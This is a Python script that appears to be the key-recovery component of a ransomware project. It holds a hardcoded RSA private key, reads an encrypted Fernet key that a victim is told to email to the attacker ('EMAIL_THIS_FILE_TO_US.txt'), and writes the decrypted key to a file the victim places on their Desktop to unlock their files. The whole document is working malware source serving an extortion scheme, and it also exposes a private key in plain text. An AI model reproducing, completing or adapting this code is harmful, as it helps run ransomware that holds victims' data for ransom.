import rsa
import os

# Establishing private key needed to unlock fernet key
private_key_pem = """
-----BEGIN RSA PRIVATE KEY-----
MIIEqQIBAAKCAQEAgcoWsUdseU21eqiUDDuv3yReCOwyaX5F95nEr0dBqgbnV3wA
UdCB8FopjKtopEGVUR412i+s2O+hp5ZTPfo9XxJB8hj2IIIhyxHNcrPdxGTbNQSk
xkDBd5q55kI+SoYDoyG7/QUZBuDvCvSCm01NC+r2guT8fpMqQCeu0S++l3QA0FFD
8mdbAM0mBkkgtU4wh84rvqTik2rJuJqXh7fEbNXS1d+LiVXwBrm7LxKR1WuOpXCj
oB6I126d34iud2cBOOUlOGK1DnIIUeKBVjc6XXYtZz+JWjoiobaETBpA94i8W3ht
DL/WbtJqj6xc3SZpaGhFJiEnfaCSGZmWGEwufQIDAQABAoIBAExv/V9Y5iymtHvR
rqdpu5FadLsiiCoTARfqiqiD+csuF68xS2rjtrMcFp5PEOiz60GD3klqjIySzIzL
fqjgqKZGNWpkgwfwPADBslKcVb5le6hE3NoZpxdOm69dUhxHwvqfUnyYNP4VGRNF
n2nhY7/iGF5Mh9vvxbjIqggxpR90sazocu4HF04WFjSIzMXBr+TzrRgY3tfe+X+C
/un1IzVpTZMnQNBTHJAom/OA+yWRt2QMWL1CD7EotfbA2RTP3MzpS27XB6leSOOQ
p5eqlNS1ck+6ug+2bMuMZax2D2p+GFKkUlvtPABWVjHqrZDlxY0WV6ToAbJC2Wx/
gOcPhIECgYkAllmpOgz5XpDyeFCTooiJTsOyXovQXJjARWAej0Pfea6wVzZX6SGN
tqhP9HwZK+F5O73sYG/84r4Wbzgg343IwdtYf8d+IH5t99YL5O53WCzJmSB0K4u+
1w3Q3PEg23J8T7bxsJz+nE9AOJ9KHTxaw5gPPNXvm2Cs8W0tidgcQgVH82Lc336o
YQJ5ANz9wzfvod7PAKTB2K8XiZNW0Lr+dfLATwluBj2Uyo/2tUzl1Aw6lMsjPGkm
OQ4na1o/1t8Ys/iwPzU1MgknXS5k08TnBS5XWUOab1TBy0+JLTnHfYgLcOjuxsNS
W3nMxo8PA20EhhK2LY7nAvDmEzQdSKaiJlrLnQKBiALwU7d3w3QOvz6MzKXzp0Nr
3dOtRfBZaACzJUXFnNujB31c6ZD7/+ofFhkAR/msmZMKXlFwPvArqQKZhUL5YYAw
imVM//Egp4OdonPiGWEW1wXwNXUYcS2A7qEy8WJ4tWdVexnpp6xkfCvfKTKzGE8U
bM/SmrFdzWOWr7ovCDZeJg7i0tBniGECeGgY5Rd5Or+wtLXnVgGMTdLoxyP+b2Ls
8Y4YlLn3V7+ez+IsNMmZ4rMZowBI8AFZ0jjN75JhmY0gwHV43FvxffQ3rIWI6Sje
Hn84xQ6gxvttO6+G5/von8Qpjdk99zcVncaPpOZ6hglUZXt2GC2PwyX+UVWk9fo5
BQKBiQCUAZXbOoJ2rXBKlLuAH6pD/4/Nksls+9KIvQ/RKHePB6U3ct9xYeEtOH26
OUTm7KqMfUwabIyaNyzXHEt9/EqkMTi9sfB5yjq0mjzeTxZaPOSNmVP3NRFx0GdJ
KxQYwO7qgcEIQllAIIKZSvchkLrVvgLx8UqS3SkncMSljdYRH2CXYl4F/eDs
-----END RSA PRIVATE KEY-----"""

# I didnt really touch this file much as it was pretty much fine the way it was hence the ish...
# Decrypting the fernet key
def decrypting_fernet_key():
    private_key = rsa.PrivateKey.load_pkcs1(private_key_pem.encode())
    with open(f'{systemRoot}/Desktop/EMAIL_THIS_FILE_TO_US.txt', 'rb') as f:
        encrypted_data = f.read()
    decrypted_data = rsa.decrypt(encrypted_data, private_key)
    with open('PLACE_ME_IN_DESKTOP_TO_UNENCRYPT.txt', 'wb') as f:
        f.write(decrypted_data)

def main():
    
    global systemRoot
    systemRoot = os.path.expanduser('~')
    decrypting_fernet_key()

main()
